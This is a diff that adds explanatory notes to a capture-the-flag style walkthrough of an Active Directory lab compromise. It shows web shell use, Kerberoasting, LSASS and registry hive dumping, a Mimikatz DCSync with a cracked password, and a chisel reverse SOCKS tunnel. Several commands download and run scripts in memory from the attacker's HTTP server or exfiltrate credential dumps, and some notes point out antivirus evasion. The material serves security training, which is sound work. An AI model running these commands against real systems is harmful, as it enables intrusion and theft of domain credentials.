@@ -53,11 +53,13 @@ ip -brief a show tun0
 # Get the Kali tun0 IP — we'll need this to serve files and receive callbacks
 # Result: 10.10.17.176/23
 ```
+> Gets your VPN interface IP address. You need this for serving files and receiving callbacks from the target. Replace `tun0` with whatever interface name your VPN uses.
 
 ```bash
 mkdir -p ~/assessment34
 # Working directory for all artifacts collected during the assessment
 ```
+> Creates a dedicated working directory to store hashes, dumps, and other artifacts collected during the assessment.
 
 ```bash
 cd ~/Downloads && python3 -m http.server 80 &
@@ -65,6 +67,7 @@ cd ~/Downloads && python3 -m http.server 80 &
 # Port 80 chosen because it's commonly allowed outbound through firewalls
 # Backgrounded with & — runs detached so we can keep working
 ```
+> Starts a simple HTTP file server on port 80. The target host can fetch tools from this server using `iwr` or `Invoke-WebRequest`. Port 80 is used because most firewalls allow it outbound. The `&` backgrounds the process so the terminal stays free.
 
 ---
 
@@ -80,6 +83,7 @@ curl -s -o /dev/null -w "%{http_code}" http://10.129.202.242/uploads/
 # -w "%{http_code}" = print just the HTTP status code
 # Result: 200 200 (both root and /uploads/ are accessible)
 ```
+> Quick HTTP status checks to confirm the web server and the uploads directory are reachable before proceeding. Replace the IP with your target.
 
 ```bash
 curl -s http://10.129.202.242/uploads/ | grep -i -E "\.aspx|\.php|shell|href"
@@ -87,10 +91,11 @@ curl -s http://10.129.202.242/uploads/ | grep -i -E "\.aspx|\.php|shell|href"
 # Result: antak.aspx, web.config
 # antak.aspx = Antak PowerShell-based ASPX web shell from Nishang
 ```
+> Fetches the uploads directory listing and filters for web shell filenames. Greps for `.aspx`, `.php`, `shell`, and links to quickly identify any accessible shells without reading the full page.
 
 ### Step 1.2 — Build an Antak shell helper
 
-Antak is form-based with ASP.NET ViewState — it does not use session cookies, so each command requires re-posting the ViewState. The form is multipart by design but the login itself accepts urlencoded POST. We build a Python helper to abstract this.
+Antak is form-based and uses ASP.NET ViewState. It does not use session cookies. Every command requires you to re-post the ViewState token from the previous response. The login form accepts URL-encoded POST data. We build a Python helper to handle this automatically.
 
 ```python
 # /tmp/antak_helper.py (the full inline version used in the assessment)
@@ -143,6 +148,7 @@ whoami
 # Result: nt authority\system
 # We're running as SYSTEM via the IIS App Pool — best possible local context
 ```
+> Confirms the security context of the web shell. `nt authority\system` means the IIS application pool is running as SYSTEM — full local access with no privilege escalation needed.
 
 ### Step 1.4 — Read the web server flag (Q1)
 
@@ -150,6 +156,7 @@ whoami
 type C:\Users\Administrator\Desktop\flag.txt
 # Result: JusT_g3tt1ng_st@rt3d!  ← Q1 answer
 ```
+> Reads the flag file from the Administrator's desktop. Replace the path with the flag location on your target.
 
 ### Step 1.5 — Profile the host
 
@@ -164,18 +171,21 @@ ipconfig /all | Select-String 'IPv4|Host'
 #   IPv4 Address: 10.129.202.242 ← external/lab network IP
 # WEB-WIN01 is dual-homed: external (10.129.x.x) and internal (172.16.6.0/16)
 ```
+> Identifies the host and its network interfaces. Dual-homed hosts (one external IP, one internal IP) are pivot points into the internal network.
 
 ```powershell
 (Get-WmiObject Win32_ComputerSystem).Domain
 # Result: INLANEFREIGHT.LOCAL
 # Domain-joined — we can use the machine account for AD queries
 ```
+> Confirms the host is domain-joined. A domain-joined machine can make LDAP queries using its machine account (HOSTNAME$) even without human user credentials.
 
 ```powershell
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select Name,IPAddress
 # Result: DC01.INLANEFREIGHT.LOCAL  172.16.6.3
 # DC is at 172.16.6.3 — only reachable from inside the network
 ```
+> Discovers all Domain Controllers (DCs) and their IP addresses using the .NET `DirectoryServices` library. No imports needed — works with the machine account context.
 
 ---
 
@@ -194,6 +204,7 @@ foreach ($r in $Result) { $r.Properties.samaccountname; $r.Properties.servicepri
 #   svc_sql                                              ← Q2 answer
 #   MSSQLSvc/SQL01.inlanefreight.local:1433
 ```
+> Queries Active Directory (AD) for the user account that owns a specific Service Principal Name (SPN). `DirectorySearcher` uses the machine account context so it works without importing PowerView or Rubeus. Replace the SPN value in the filter with your target SPN.
 
 ### Step 2.2 — Stage Invoke-Kerberoast on Kali
 
@@ -204,6 +215,7 @@ ls ~/Downloads/Invoke-Kerberoast.ps1
 # We serve this via our Python HTTP server so the target can IEX-download it
 # Reason: we don't have Rubeus.exe staged, and PowerShell-only avoids dropping a binary
 ```
+> Stages the Invoke-Kerberoast script in the HTTP server directory. The target will download and execute it entirely in memory — no binary dropped to disk. The script is bundled with PowerShell Empire on Kali.
 
 ### Step 2.3 — Run Invoke-Kerberoast through the web shell
 
@@ -220,6 +232,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.176/Invoke-Kerber
 #   | Select-Object -ExpandProperty Hash = strip metadata, output just the hash blob
 # Result: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$EC51...
 ```
+> Downloads and executes Invoke-Kerberoast in memory, then requests a TGS ticket for the target account and outputs it in hashcat format. Use single quotes around the URL when running through Antak — double quotes get stripped by the shell tokenizer.
 
 ### Step 2.4 — Crack the hash on Kali (Q3)
 
@@ -235,6 +248,7 @@ python3 -c "h=open('/home/victus/assessment34/svc_sql.hash').read().strip(); blo
 # Hashcat will silently exhaust the wordlist without cracking — this check saves hours
 # Result: hash len: 2160, even: True ✓
 ```
+> Saves the TGS hash to a file, then runs a quick sanity check to confirm the hash is not corrupted. A hash with an odd number of hex characters was truncated during copy-paste and will silently fail to crack — always verify before spending time in hashcat.
 
 ```bash
 hashcat -m 13100 ~/assessment34/svc_sql.hash /usr/share/wordlists/rockyou.txt -O
@@ -243,6 +257,7 @@ hashcat -m 13100 ~/assessment34/svc_sql.hash /usr/share/wordlists/rockyou.txt -O
 # -O = optimized kernel — much faster, caps at 31-char passwords (fine for service accounts)
 # Result: svc_sql:lucky7  ← Q3 answer (cracked in <2 seconds)
 ```
+> Cracks the Kerberos TGS hash using the rockyou wordlist. `-m 13100` is the correct mode for Kerberos 5 TGS-REP (RC4-HMAC). `-O` enables the optimized kernel for significantly faster cracking.
 
 ---
 
@@ -279,7 +294,7 @@ Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptB
 
 ## Phase 4 — LSASS Dump on MS01 (start of Q5/Q6 chain)
 
-The standard recipe: dump LSASS via `comsvcs.dll MiniDump`, exfil the .dmp, parse with pypykatz.
+The standard approach: dump the Local Security Authority Subsystem Service (LSASS) process via `comsvcs.dll MiniDump`, transfer the dump file, then parse it offline with pypykatz.
 
 ### Step 4.1 — Get LSASS PID and dump it
 
@@ -302,6 +317,7 @@ Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptB
 # Start-Sleep 3 = give the dump 3s to flush to disk
 # Result: lsass.dmp ~46 MB written to C:\Windows\Temp\
 ```
+> Dumps the LSASS process from MS01 using `comsvcs.dll`. This avoids dropping Mimikatz on disk — `comsvcs.dll` is Microsoft-signed and bypasses many antivirus (AV) products. `Start-Sleep 3` gives the dump time to flush before checking for the file.
 
 ### Step 4.2 — Copy the dump from MS01 → WEB-WIN01
 
@@ -319,6 +335,7 @@ Get-Item C:\Windows\Temp\lsass.dmp
 # Remove-PSDrive MS = clean up the mount
 # Result: 45,924,709 bytes copied to C:\Windows\Temp\lsass.dmp on WEB-WIN01
 ```
+> Mounts MS01's C: drive as a local PowerShell drive and pulls the dump file over Server Message Block (SMB). `New-PSDrive` is cleaner than UNC paths in remoting sessions. `Remove-PSDrive` cleans up the mount when done.
 
 ### Step 4.3 — Stage the dump in the web root and download to Kali
 
@@ -332,6 +349,7 @@ Rename-Item C:\inetpub\wwwroot\uploads\lsass.dmp lsass.txt
 # .txt is served as text/plain — IIS allows the download
 # Result: 45 MB file accessible at /uploads/lsass.txt
 ```
+> Copies the dump into the Internet Information Services (IIS) web root so Kali can download it. The `.dmp` extension returns a 404 because IIS blocks it by default. Renaming to `.txt` bypasses the block.
 
 ```bash
 curl -s -o ~/assessment34/lsass.dmp http://10.129.202.242/uploads/lsass.txt
@@ -339,6 +357,7 @@ file ~/assessment34/lsass.dmp
 # file command verifies we got a valid dump file
 # Result: Mini DuMP crash report, 13 streams, ... 0x6 type  ✓
 ```
+> Downloads the dump to Kali and confirms it is a valid minidump. The `file` command reads the file header — a valid dump shows "Mini DuMP crash report."
 
 ### Step 4.4 — Parse with pypykatz
 
@@ -360,6 +379,7 @@ pypykatz lsa minidump ~/assessment34/lsass.dmp 2>&1 | grep -B 1 -A 20 "tpetty"
 #     AES128 Key: fd37b6fec5704cadabb319cebf9e3a3a
 #     AES256 Key: f6582e6ef03b4d1a5017da414d4bddb469b66b006c66380f66654bd4be28f634
 ```
+> Parses the LSASS minidump offline with pypykatz. This avoids running Mimikatz on the target, which most antivirus products detect. The NT hash for tpetty appears in the MSV section.
 
 ```bash
 # Try to crack tpetty's NTLM hash with rockyou — first attempt to get cleartext
@@ -369,12 +389,13 @@ hashcat -m 1000 ~/assessment34/tpetty.ntlm /usr/share/wordlists/rockyou.txt -O
 # Result: Status: Exhausted — password is NOT in rockyou
 # Pivot to looking for plaintext elsewhere (LSA Secrets is the next stop)
 ```
+> Attempts to crack tpetty's NTLM hash with rockyou. `-m 1000` is NTLM mode. The hash is not in rockyou, so we move on to extracting plaintext from LSA Secrets instead.
 
 ---
 
 ## Phase 5 — LSA Secrets Dump (Q5 + Q6)
 
-LSASS dump didn't yield tpetty's cleartext. The next place credentials live: **LSA Secrets** in the SECURITY hive — this stores auto-logon passwords, service account passwords, DPAPI keys.
+The LSASS dump did not reveal tpetty's cleartext password. The next place to look is **LSA Secrets** in the SECURITY registry hive. This stores auto-logon passwords, service account passwords, and Data Protection API (DPAPI) keys.
 
 ### Step 5.1 — Save SAM/SYSTEM/SECURITY hives on MS01
 
@@ -394,6 +415,7 @@ Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential $cred -ScriptB
 # Why all three: secretsdump.py needs SYSTEM (for boot key) + SAM/SECURITY to decrypt
 # Result: 3 .hive files in C:\Windows\Temp on MS01
 ```
+> Saves the three registry hives to disk on MS01. The SYSTEM hive contains the SYSKEY used to decrypt the others. You need all three for `secretsdump.py` to parse LSA Secrets offline.
 
 ### Step 5.2 — Copy hives to Kali (same path as LSASS dump)
 
@@ -407,6 +429,7 @@ Copy-Item MSX:\Windows\Temp\security.hive C:\inetpub\wwwroot\uploads\security.tx
 Remove-PSDrive MSX
 # Same staging pattern: SMB pull → IIS web root → .txt extension to bypass IIS blocks
 ```
+> Copies all three hive files from MS01 to the IIS web root using the same SMB/IIS staging trick from the LSASS dump. Rename each to `.txt` so IIS will serve them for download.
 
 ```bash
 for h in sam system security; do
@@ -419,6 +442,7 @@ done
 #   system: 16064512 bytes  (~16 MB, registry can be big)
 #   security: 45056 bytes
 ```
+> Downloads all three hive files to Kali in a loop and prints each file size to confirm the transfer completed.
 
 ### Step 5.3 — Parse hives with secretsdump.py
 
@@ -428,6 +452,7 @@ cd ~/assessment34 && secretsdump.py -sam sam.hive -system system.hive -security 
 # -sam, -system, -security = the three saved hives
 # LOCAL = positional arg telling secretsdump these are offline hives
 ```
+> Parses all three hives offline. `LOCAL` tells secretsdump to read from files instead of connecting to a remote host. The SYSTEM hive provides the decryption key for the SAM and SECURITY hives.
 
 **Critical output:**
 ```
@@ -469,7 +494,7 @@ So the LSA secret `DefaultPassword = Sup3rS3cur3D0m@inU2eR` belongs to the domai
 
 ## Phase 6 — Identify Attack Path for tpetty (Q7)
 
-tpetty has no group privileges (`whoami` would only show Domain Users). The win must be ACL-based.
+tpetty has no special group memberships (`whoami` only shows Domain Users). The privilege must come from an Access Control List (ACL) entry on a specific AD object.
 
 ### Step 6.1 — Check tpetty's group memberships first
 
@@ -490,6 +515,7 @@ foreach ($sid in $user.tokenGroups) {
 #   INLANEFREIGHT\Domain Users
 # No special groups — privilege must be at the ACL level on a specific AD object
 ```
+> Lists all of tpetty's group memberships including nested groups. The result only shows standard groups. That means the privilege comes from a Discretionary Access Control List (DACL) entry on an AD object, not from group membership.
 
 ### Step 6.2 — Stage PowerView and check ACLs
 
@@ -498,6 +524,7 @@ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/Downloads/Powe
 # PowerView = comprehensive AD enumeration script
 # Has Get-DomainObjectAcl which resolves DACL aces and shows ObjectAceType (GUIDs → names)
 ```
+> Stages PowerView in the HTTP server directory so the target can download it in memory.
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.176/PowerView.ps1')
@@ -507,6 +534,7 @@ Get-DomainObjectAcl -Identity 'DC=INLANEFREIGHT,DC=LOCAL' -ResolveGUIDs | Where-
 # -ResolveGUIDs = translate the extended-right GUIDs into readable names
 # Where-Object filter = only show ACEs where tpetty's SID is the principal
 ```
+> Downloads PowerView in memory and checks ACLs on the domain root object. DCSync rights are granted at the domain root level. `-ResolveGUIDs` converts raw Global Unique Identifiers (GUIDs) into readable right names.
 
 **Result:**
 ```
@@ -529,7 +557,7 @@ Any user with the first two can perform DCSync to extract every account's hash. 
 
 ---
 
-## Phase 7 — DCSync to Steal Administrator's Hash
+## Phase 7 — DCSync to Extract the Administrator Hash
 
 ### Step 7.1 — Stage Mimikatz on Kali
 
@@ -553,9 +581,9 @@ Get-Item C:\Windows\Temp\mk.exe
 
 ### Step 7.3 — DCSync with tpetty's credentials (the trick)
 
-**Problem:** Our shell runs as IIS AppPool with restricted privileges. `Start-Process -Credential` fails with "Access is denied". `runas` requires interactive password. Standard PTH (`sekurlsa::pth`) also failed with "Key import" error (LSA Protection blocked).
+**Problem:** Our shell runs as the IIS AppPool with restricted privileges. `Start-Process -Credential` fails with "Access is denied." `runas` requires an interactive password prompt. Standard pass-the-hash via `sekurlsa::pth` also failed with a "Key import" error because Local Security Authority (LSA) Protection was enabled.
 
-**Solution:** Mimikatz's `lsadump::dcsync` has built-in `/authuser` parameters that pass credentials directly to the RPC call — no impersonation needed.
+**Solution:** Mimikatz's `lsadump::dcsync` has built-in `/authuser` parameters that pass credentials directly to the Remote Procedure Call (RPC) connection. No token impersonation is needed.
 
 ```powershell
 C:\Windows\Temp\mk.exe 'privilege::debug' 'lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\Administrator /authuser:tpetty /authdomain:INLANEFREIGHT /authpassword:Sup3rS3cur3D0m@inU2eR' 'exit'
@@ -568,6 +596,7 @@ C:\Windows\Temp\mk.exe 'privilege::debug' 'lsadump::dcsync /domain:INLANEFREIGHT
 # /authpassword:Sup3rS3cur3D0m@inU2eR = tpetty's cleartext password (we have it from LSA secrets!)
 # 'exit' = quit Mimikatz after the command (prevents interactive prompt hang)
 ```
+> Runs DCSync using tpetty's credentials passed directly to the RPC layer via `/authuser`. This bypasses token impersonation entirely — the DC sees the RPC call as coming from tpetty, who has DS-Replication rights. The Administrator NTLM hash comes back in the output.
 
 **Result:**
 ```
@@ -589,13 +618,13 @@ Credentials:
   aes128_hmac       (4096) : 69e27df2550c5c270eca1d8ce5c46230
 ```
 
-**Why `/authuser` works while everything else failed:** DCSync is an RPC call to the DC. The DC checks whether the RPC caller has DS-Replication rights. With `/authuser`, Mimikatz builds the RPC binding using tpetty's credentials directly — no Windows token impersonation required. This bypasses LSA Protection / Credential Guard restrictions on local PTH.
+**Why `/authuser` works while everything else failed:** DCSync is an RPC call to the Domain Controller (DC). The DC checks whether the RPC caller has DS-Replication rights. With `/authuser`, Mimikatz builds the RPC binding using tpetty's credentials directly. No Windows token impersonation is needed. This sidesteps LSA Protection and Credential Guard restrictions on local pass-the-hash.
 
 ---
 
 ## Phase 8 — Reach DC01 via SOCKS Proxy
 
-We have the Administrator NTLM hash but Kali can't reach `172.16.6.3` directly (internal subnet). Set up a reverse SOCKS proxy through the web shell.
+We have the Administrator New Technology LAN Manager (NTLM) hash but Kali cannot reach `172.16.6.3` directly — it is on the internal subnet. We need a reverse SOCKS proxy tunneled through the web shell.
 
 ### Step 8.1 — Download chisel on Kali
 
@@ -607,6 +636,7 @@ gunzip -f chisel.gz && chmod +x chisel
 # Linux build for Kali, Windows build for the target
 # Result: 1.10.1
 ```
+> Downloads the Linux version of chisel to Kali. Chisel is a single static binary that tunnels TCP connections over HTTP. It supports reverse SOCKS5 proxies, which lets the compromised host connect out to us.
 
 ```bash
 cd /tmp && curl -sL -o /tmp/chisel_win.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
@@ -614,6 +644,7 @@ gunzip -f /tmp/chisel_win.gz
 cp /tmp/chisel_win ~/Downloads/chisel.exe
 # Get the Windows version too, place in HTTP server dir for the target to download
 ```
+> Downloads the Windows version of chisel and copies it to the HTTP server directory so the target can download it.
 
 ### Step 8.2 — Start chisel server on Kali
 
@@ -626,6 +657,7 @@ cp /tmp/chisel_win ~/Downloads/chisel.exe
 # Backgrounded so we keep our terminal
 # Server log: "Listening on http://0.0.0.0:8000"
 ```
+> Starts the chisel server on Kali. `--reverse` allows the client (target) to open SOCKS listeners on the server (Kali). The server logs all connections to `/tmp/chisel.log`. Run this before deploying the client.
 
 ### Step 8.3 — Drop chisel on the target and connect it back
 
@@ -634,6 +666,7 @@ iwr http://10.10.17.176/chisel.exe -o C:\Windows\Temp\chisel.exe
 Get-Item C:\Windows\Temp\chisel.exe
 # Download chisel binary to the target via our HTTP server
 ```
+> Downloads the chisel Windows binary from our HTTP server to the target. Confirm the file size matches what was uploaded.
 
 ```powershell
 Start-Process -FilePath C:\Windows\Temp\chisel.exe -ArgumentList 'client 10.10.17.176:8000 R:1080:socks' -WindowStyle Hidden
@@ -647,6 +680,7 @@ Get-Process chisel | select Id,Name
 # -WindowStyle Hidden = no visible window (cleaner)
 # Result: chisel running as PID 2116 on the target
 ```
+> Launches chisel on the target in detached mode. `R:1080:socks` tells chisel to open a SOCKS5 listener on port 1080 of the Kali server side. The `-WindowStyle Hidden` hides the console window.
 
 **Confirm the tunnel:**
 ```bash
@@ -655,6 +689,7 @@ cat /tmp/chisel.log | tail -3
 # session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 # Our local 127.0.0.1:1080 now SOCKS-routes through chisel → through WEB-WIN01 → into the internal network
 ```
+> Checks the chisel server log to confirm the tunnel is active. "Listening" means SOCKS5 traffic on 127.0.0.1:1080 now routes through WEB-WIN01 into the internal network.
 
 ### Step 8.4 — Configure proxychains and test the tunnel
 
@@ -682,6 +717,7 @@ proxychains -q -f /tmp/proxychains.conf nc -z -w 3 172.16.6.3 5985
 # Results: Port 445 reachable, Port 5985 reachable  ✓
 # Both SMB and WinRM open on DC01 — multiple PTH options available
 ```
+> Creates a custom proxychains config pointing at the chisel SOCKS5 listener, then confirms both SMB (port 445) and WinRM (port 5985) are reachable on DC01 through the tunnel. Both ports open means multiple pass-the-hash options are available.
 
 ---
 
